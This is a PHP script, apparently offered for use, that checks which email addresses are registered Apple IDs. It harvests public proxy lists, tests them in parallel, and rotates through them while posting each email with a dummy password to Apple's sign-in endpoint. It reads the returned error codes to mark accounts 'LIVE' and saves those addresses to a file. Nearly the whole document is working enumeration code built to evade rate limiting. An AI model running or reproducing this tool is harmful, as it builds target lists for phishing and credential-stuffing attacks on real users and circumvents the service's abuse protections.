<?php
/**
 * Apple ID Checker v10.0 ELITE - HSFD 403
 * Fitur: Multi-Thread Proxy Checker + Deep Proxy Rotation per Email
 * Logic: -20283 = LIVE | -20201/-20101 = DIE
 */

class Colors {
    const RESET = "\033[0m";
    const GREEN = "\033[1;32m";
    const RED = "\033[1;31m";
    const YELLOW = "\033[1;33m";
    const CYAN = "\033[1;36m";
    const WHITE = "\033[1;37m";
    const BGGREEN = "\033[42m";
    const BGRED = "\033[41m";

    public static function text($text, $color) { return $color . $text . self::RESET; }
    public static function status($status) {
        if ($status == 'LIVE') return self::text(' LIVE ', self::BGGREEN . self::WHITE);
        if ($status == 'DIE') return self::text(' DIE  ', self::BGRED . self::WHITE);
        return self::text(' WAIT ', "\033[43m" . self::WHITE);
    }
}

class AppleChecker {
    private $initUrl = 'https://idmsa.apple.com/appleauth/auth/signin/init';
    private $checkUrl = 'https://idmsa.apple.com/appleauth/auth/signin/complete?isRememberMeEnabled=true';
    public $validProxies = [];
    public $maxCollect = 500;

    /**
     * TAHAP 1: GRABBING PROXY
     */
    public function fetchAndFilter() {
        echo Colors::text("\n[*] Grabbing Proxies...", Colors::YELLOW) . "\n";
        $urls = [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
        ];
        $raw = [];
        foreach ($urls as $url) {
            $content = @file_get_contents($url);
            if ($content) $raw = array_merge($raw, explode("\n", trim($content)));
        }
        $raw = array_slice(array_values(array_unique(array_filter($raw))), 0, $this->maxCollect);
        
        echo Colors::text("[*] System: Validating " . count($raw) . " Proxies Interactively...\n", Colors::CYAN);
        $this->validProxies = $this->validateProxies($raw);
        echo Colors::text("\n[+] Success: " . count($this->validProxies) . " High-Quality Proxies Ready.\n\n", Colors::GREEN);
    }

    /**
     * TAHAP 2: PARALLEL PROXY CHECKER
     */
    private function validateProxies($list) {
        $alive = [];
        $batches = array_chunk($list, 50); // Cek 50 proxy sekaligus (Fast)
        foreach ($batches as $batch) {
            $mh = curl_multi_init();
            $handles = [];
            foreach ($batch as $proxy) {
                $ch = curl_init("http://httpbin.org/ip");
                curl_setopt_array($ch, [
                    CURLOPT_PROXY => trim($proxy),
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT => 5,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_CONNECTTIMEOUT => 3
                ]);
                curl_multi_add_handle($mh, $ch);
                $handles[$proxy] = $ch;
            }
            $running = null;
            do { curl_multi_exec($mh, $running); } while ($running);
            foreach ($handles as $proxy => $ch) {
                if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == 200) {
                    $alive[] = $proxy;
                    echo Colors::text("●", Colors::GREEN);
                } else {
                    echo Colors::text("x", Colors::RED);
                }
                curl_multi_remove_handle($mh, $ch);
            }
            curl_multi_close($mh);
        }
        return $alive;
    }

    /**
     * TAHAP 3: DEEP ROTATION CHECKER
     */
    public function deepCheck($email) {
        $ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
        
        foreach ($this->validProxies as $proxy) {
            $proxy = trim($proxy);
            
            // Sub-Step 1: Init Session
            $ch = curl_init($this->initUrl);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_PROXY => $proxy,
                CURLOPT_USERAGENT => $ua,
                CURLOPT_TIMEOUT => 8
            ]);
            $res = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $hSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
            $header = substr($res, 0, $hSize);
            curl_close($ch);

            if ($httpCode != 200) { echo Colors::text("!", Colors::RED); continue; }

            preg_match('/scnt: (.*)/', $header, $scnt);
            $scnt = trim($scnt[1] ?? '');
            preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $header, $cookies);
            $cookieStr = implode('; ', $cookies[1]);

            // Sub-Step 2: Check Email
            $ch = curl_init($this->checkUrl);
            $payload = json_encode([
                "accountName" => $email,
                "password" => "HSFD403_Auth_v10!", 
                "rememberMe" => false
            ]);

            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $payload,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_PROXY => $proxy,
                CURLOPT_HTTPHEADER => [
                    'Content-Type: application/json',
                    'X-Apple-Widget-Key: d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d',
                    'X-Apple-SCNT: ' . $scnt,
                    'Cookie: ' . $cookieStr,
                    'Referer: https://account.apple.com/',
                    'X-Requested-With: XMLHttpRequest'
                ],
                CURLOPT_USERAGENT => $ua,
                CURLOPT_TIMEOUT => 12
            ]);

            $res = curl_exec($ch);
            curl_close($ch);
            $json = json_decode($res, true);
            $code = $json['serviceErrors'][0]['code'] ?? null;

            if ($code == '-20283') return ['status' => 'LIVE', 'code' => $code];
            if ($code == '-20201' || $code == '-20101' || $code == '-20751') return ['status' => 'DIE', 'code' => $code];

            echo Colors::text("?", Colors::YELLOW);
        }
        return ['status' => 'ERROR', 'msg' => 'Exhausted'];
    }
}

// === BOOTSTRAP ===
echo Colors::text("\n ╔══════════════════════════════════════════════════════════╗\n", Colors::CYAN);
echo Colors::text(" ║           APPLE ID CHECKER v10.0 ELITE - HSFD 403        ║\n", Colors::CYAN);
echo Colors::text(" ║           Multi-Thread Proxy Checker Integrated          ║\n", Colors::CYAN);
echo Colors::text(" ╚══════════════════════════════════════════════════════════╝\n\n", Colors::CYAN);

$file = $argv[1] ?? 'emails.txt';
if (!file_exists($file)) die("Gunakan: php script.php emails.txt\n");

$emails = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$checker = new AppleChecker();
$checker->fetchAndFilter();

$live = 0; $die = 0;
foreach ($emails as $index => $email) {
    echo Colors::text("[" . ($index+1) . "/" . count($emails) . "] ", Colors::WHITE) . str_pad($email, 35) . " ";
    
    $res = $checker->deepCheck($email);
    
    echo Colors::CLEAR_LINE;
    echo "[" . ($index+1) . "/" . count($emails) . "] " . str_pad($email, 35) . " ";
    
    if ($res['status'] == 'LIVE') {
        $live++;
        echo Colors::status('LIVE') . " " . Colors::text("CODE: " . $res['code'], Colors::GREEN);
        file_put_contents("live_stable.txt", $email . PHP_EOL, FILE_APPEND);
    } elseif ($res['status'] == 'DIE') {
        $die++;
        echo Colors::status('DIE') . " " . Colors::text("CODE: " . $res['code'], Colors::RED);
    } else {
        echo Colors::text("FAILED (All Proxies Blocked)", Colors::RED);
    }
    echo "\n";
}

echo "\n" . Colors::text("JOB FINISHED: LIVE[$live] DIE[$die]", Colors::CYAN) . "\n";
echo "Signed by HSFD 403\n";
